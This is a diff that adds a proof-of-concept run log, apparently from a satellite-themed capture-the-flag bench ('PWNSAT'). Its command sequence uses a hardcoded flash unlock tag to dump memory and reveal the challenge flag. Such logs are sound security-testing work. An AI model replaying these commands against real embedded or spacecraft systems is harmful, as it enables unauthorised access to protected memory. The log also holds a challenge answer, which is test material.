@@ -1,0 +1,66 @@
+[   0.000] ========================================================================
+[   0.000] V0-09 FLASH_READ hardcoded unlock tag
+[   0.000] ========================================================================
+[   1.517] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.856] --> TC apid=0x0A via=usb AES  payload=00
+[   8.898] <-- TM apid=0x0A clear len=3
+[   8.950] --> TC apid=0x1D via=usb clear payload=0101
+[   9.001] <-- TM apid=0x1D clear len=4
+[   9.001] --> TC apid=0x11 via=usb clear payload=00
+[   9.462] <-- TM apid=0x11 clear len=9
+[   9.462] --> TC apid=0x15 via=usb clear payload=001005
+[   9.912] <-- TM apid=0x15 clear len=6
+[   9.912] --> TC apid=0x0D via=usb clear payload=01
+[  10.363] <-- TM apid=0x0D clear len=4
+[  10.415] --> TC apid=0x1D via=usb clear payload=03
+[  10.456] <-- TM apid=0x1D clear len=4
+[  10.456] <-- TM apid=0x09 clear len=9
+[  10.508] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.559] <-- TM apid=0x1D clear len=4
+[  10.560] --> TC apid=0x10 via=usb clear payload=00
+[  10.611] <-- TM apid=0x10 clear len=4
+[  10.611] --> TC apid=0x21 via=usb clear payload=00
+[  11.072] <-- TM apid=0x21 clear len=6
+[  11.072] --> TC apid=0x24 via=usb clear payload=0000
+[  11.114] <-- TM apid=0x24 clear len=8
+[  11.114] --> TC apid=0x24 via=usb clear payload=0100
+[  11.165] <-- TM apid=0x24 clear len=8
+[  11.165] --> TC apid=0x24 via=usb clear payload=0200
+[  11.217] <-- TM apid=0x24 clear len=8
+[  11.217] --> TC apid=0x24 via=usb clear payload=0300
+[  11.268] <-- TM apid=0x24 clear len=8
+[  11.268] --> TC apid=0x25 via=usb clear payload=0080
+[  11.320] <-- TM apid=0x25 clear len=4
+[  11.320] --> TC apid=0x1E via=usb clear payload=01
+[  11.821] <-- TM apid=0x1E clear len=5
+[  11.821] --> TC apid=0x1D via=usb clear payload=0b
+[  11.914] <-- TM apid=0x1D clear len=4
+[  11.914] --> TC apid=0x05 via=usb clear payload=12
+[  12.374] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.886] <-- TM apid=0x1F clear len=4
+[  12.886] --> TC apid=0x1F via=usb clear payload=05
+[  13.388] <-- TM apid=0x1F clear len=4
+[  13.388] --> TC apid=0x0A via=usb clear payload=01
+[  13.432] <-- TM apid=0x0A AES len=3
+[  21.522] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.000] <-- TM apid=0x0E AES len=18
+[  30.000] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.073] --> TC apid=0x0B via=usb AES  payload=a4000020c35a
+[  30.527] <-- TM apid=0x09 AES len=20
+[  30.527] --> TC apid=0x0B via=usb AES  payload=a50000201234
+[  30.979] <-- TM apid=0x09 AES len=20
+[  30.979] --> TC apid=0x0B via=usb AES  payload=a5000020c35a
+[  31.025] <-- TM apid=0x0B AES len=37
+[  31.025] --> TC apid=0x0B via=usb AES  payload=a5200020c35a
+[  31.081] <-- TM apid=0x0B AES len=37
+[  31.081] --> TC apid=0x0B via=usb AES  payload=a5400020c35a
+[  31.126] <-- TM apid=0x0B AES len=37
+[  31.126] --> TC apid=0x0B via=usb AES  payload=a5600020c35a
+[  31.182] <-- TM apid=0x0B AES len=35
+[  31.182] dumped blob (126 B):
+b'OPS:STORE_FORWARD=ENABLED\r\nOPS:PAYLOAD_WINDOW=0420Z\r\nMAINT:FLASH_WINDOW=A5:C35A\r'
+b'\nFLAG=PWNSAT{flash_window_store_and_forward}\r\n'
+[  31.182] -- console tail: [TC - SPP] APID=0x01F SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00A SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] Secure link enabled | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00B SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00B SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00B SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00B SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00B SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00B SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[  31.182] ========================================================================
+[  31.182] POC OK
+[  31.182] ========================================================================
